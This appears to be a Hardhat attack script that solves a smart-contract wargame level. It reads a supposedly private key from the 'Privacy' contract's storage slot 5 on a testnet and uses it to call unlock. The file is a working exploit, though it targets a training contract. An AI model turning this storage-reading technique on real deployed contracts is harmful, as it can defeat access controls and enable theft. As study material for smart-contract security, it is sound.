const { ethers, network, getNamedAccounts, waffle } = require("hardhat");
const { networkConfig } = require("../helper-hardhat-config");
const {
  abi: PrivacyABI,
} = require("../artifacts/contracts/12-privacy/Privacy.sol/Privacy.json");

/*
contract Privacy {

  // slot 0
  bool public locked = true;

  // slot 1
  uint256 public ID = block.timestamp;

  // slot 2
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(now);

  // slot 3, 4, 5
  bytes32[3] private data;

  constructor(bytes32[3] memory _data) public {
    data = _data;
  }
  
  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }
}
*/

async function attackPrivacy() {
  const chainId = network.config.chainId;
  if (chainId == 4) {
    const waitBlockConfirmations = 1;
    const provider = waffle.provider;

    const [attacker1] = await ethers.getSigners();
    const privacy = new ethers.Contract(
      networkConfig[chainId]["privacy"],
      PrivacyABI,
      attacker1
    );

    const lockedBefore = await privacy.locked();
    if (!lockedBefore) {
      throw new Error("Privacy already unlocked before attack");
    }
    const slot5 = await provider.getStorageAt(
      privacy.address,
      ethers.BigNumber.from("5")
    );

    const key = "0x" + slot5.slice(2, 34);
    const tx = await privacy.unlock(key);
    tx.wait();
    const lockedAfter = await privacy.locked();
    if (!lockedAfter) {
      console.log("Privacy unlocked!");
    } else {
      throw new Error("Attack failed");
    }
  }
}

attackPrivacy()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
